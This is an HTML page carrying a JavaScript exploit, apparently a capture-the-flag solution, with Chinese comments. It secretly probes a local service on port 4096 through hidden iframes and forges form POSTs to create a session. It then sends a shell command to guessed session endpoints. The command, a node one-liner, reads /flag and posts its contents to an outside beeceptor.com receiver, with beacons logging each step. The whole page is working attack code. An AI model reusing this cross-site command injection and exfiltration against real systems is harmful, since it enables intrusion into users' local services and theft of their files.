<!DOCTYPE html>
<html>
<body>
<script>
(function() {
    // 替换为你的接收端地址
    const EXFIL = "https://1233334.free.beeceptor.com";
    const RUN_ID = Math.random().toString(36).substring(2) + Date.now();

    function beacon(action, extra) {
        let img = new Image();
        img.src = `${EXFIL}/log?run=${RUN_ID}&action=${encodeURIComponent(action)}` + (extra ? `&${extra}` : '');
    }

    // Payload: 使用 node 修改 flag 权限并外发
    const PAYLOAD = `node -e "require('fs').chmodSync('/flag', 0o644); require('http').request('${EXFIL}/flag?run=${RUN_ID}',{method:'POST'},r=>{}).end(require('fs').readFileSync('/flag'))"`;

    const BASE = 'http://localhost:4096';

    // 通过隐藏 iframe 提交表单，避免页面跳转
    function postForm(url, data) {
        let iframe = document.createElement('iframe');
        iframe.name = 'hiddenFormTarget';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        let form = document.createElement('form');
        form.method = 'POST';
        form.action = url;
        form.target = 'hiddenFormTarget';
        form.style.display = 'none';
        for (let key in data) {
            let input = document.createElement('input');
            input.type = 'hidden';
            input.name = key;
            input.value = data[key];
            form.appendChild(input);
        }
        document.body.appendChild(form);
        form.submit();
        setTimeout(() => {
            form.remove();
            iframe.remove();
        }, 1000);
    }

    beacon('start');

    // 探测端口 4096 是否开放
    let probe = document.createElement('iframe');
    probe.style.display = 'none';
    probe.src = BASE + '/';
    probe.onload = () => {
        beacon('port_open');
        // 第一步：创建会话，让服务端设置 Cookie
        postForm(BASE + '/session', {});
        // 第二步：稍等片刻，发送命令（尝试多个可能的 session id）
        setTimeout(() => {
            const ids = ['1', '2', '3', 'session', 'default', 'test-session-123'];
            ids.forEach(id => {
                postForm(BASE + `/session/${id}/shell`, { command: PAYLOAD });
            });
            beacon('exploit_sent');
        }, 1000);
    };
    probe.onerror = () => beacon('port_error');
    document.body.appendChild(probe);
})();
</script>
</body>
</html>
